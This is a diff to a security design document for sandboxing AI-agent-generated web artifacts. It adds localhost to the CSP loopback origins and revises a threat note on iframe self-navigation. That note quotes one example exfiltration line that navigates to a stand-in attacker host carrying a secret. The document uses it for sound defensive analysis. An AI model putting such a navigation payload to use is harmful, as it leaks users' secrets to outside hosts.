@@ -71,15 +71,22 @@ proven by `test-security.sh`):
 Content-Security-Policy:
   sandbox allow-scripts allow-top-navigation-by-user-activation;
   default-src 'none';
-  script-src 'unsafe-inline' 'unsafe-eval' http://127.0.0.1:PORT;
-  style-src  'unsafe-inline' http://127.0.0.1:PORT;
-  img-src    http://127.0.0.1:PORT data:;
-  font-src   http://127.0.0.1:PORT;
+  script-src 'unsafe-inline' 'unsafe-eval' http://127.0.0.1:PORT http://localhost:PORT;
+  style-src  'unsafe-inline' http://127.0.0.1:PORT http://localhost:PORT;
+  img-src    http://127.0.0.1:PORT http://localhost:PORT data:;
+  font-src   http://127.0.0.1:PORT http://localhost:PORT;
   connect-src 'none';            /* Wave 2a widens this to the named host for SSE — never to a foreign host */
   object-src 'none'; frame-src 'none'; worker-src 'none';
   base-uri 'none'; form-action 'none';
-  frame-ancestors http://127.0.0.1:PORT;
+  frame-ancestors http://127.0.0.1:PORT http://localhost:PORT;
 ```
+
+**Both loopback origins are named.** The shell is reachable at `127.0.0.1` *and*
+`localhost` (distinct origins to a browser), and the iframe `src` is relative, so
+it inherits whichever the user opened. Naming only `127.0.0.1` would make the
+browser refuse to frame/run an artifact opened via `localhost`. Both resolve to
+the same loopback server, so this widens nothing externally. The control-plane
+`host_guard` accepts the same two names and rejects everything else, fail-closed.
 
 ### Decision (Phase 1, frozen): `script-src` includes `'unsafe-eval'`
 
@@ -115,12 +122,23 @@ Notes / open items resolved during Phase 1:
 - `/_gp/v1/*` needs `Access-Control-Allow-Origin: *` (no credentials) for the
   requests that are CORS-gated (modules, fonts, `fetch` of data); classic
   `<script src>`/`<link>` are not.
-- CSP does **not** stop the artifact navigating *its own* iframe to an external
-  URL — accepted as a residual channel; the parent restores the expected
-  document on unexpected navigation.
-- Also set `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, and
-  a `Permissions-Policy` deny-list (`camera=(), microphone=(), geolocation=() …`)
-  on artifact + asset responses.
+- **Self-navigation is more contained than first thought (Phase-1 finding).**
+  Fetch directives don't govern navigation, so the concern was that an artifact
+  could `location.href = "http://attacker/?"+secret`. But when the artifact is
+  **framed by the shell**, the *parent's* `frame-src 'self'` governs the framed
+  context's navigations — Chromium **blocks** the framed artifact from navigating
+  its iframe to a foreign origin (verified in `test-security.sh`: the network
+  canary stays empty). The residual is narrower than stated:
+  - A **direct-opened** (top-level) artifact has no parent `frame-src` and *can*
+    self-navigate — but it holds no cross-frame secret; it is the agent's own
+    content leaking its own data. Mitigated by Wave 4's parent restoring the doc.
+  - **User-gesture top navigation** (`allow-top-navigation-by-user-activation`,
+    kept for `plan.md §8`'s full-document `target="_top"` cross-nav) remains a
+    click-gated channel. Flagged for the PO to weigh — see the terminal report.
+- Also set `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`,
+  `Cache-Control: no-store` (no stale CSP/nonce), and a `Permissions-Policy`
+  deny-list (`camera=(), microphone=(), geolocation=() …`) on artifact + asset
+  responses.
 
 ## 5. The control plane never trusts the sandbox
 
